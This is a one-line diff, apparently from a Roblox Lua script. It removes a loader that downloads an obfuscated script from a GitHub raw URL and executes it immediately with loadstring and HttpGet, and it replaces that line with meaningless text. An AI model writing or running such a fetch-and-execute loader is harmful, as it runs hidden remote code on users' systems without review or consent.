@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dangnguyenminhienjinmzx/super-duper-bassoon/refs/heads/main/25ms_obf.lua%20(15).txt"))()
+kskssjsj
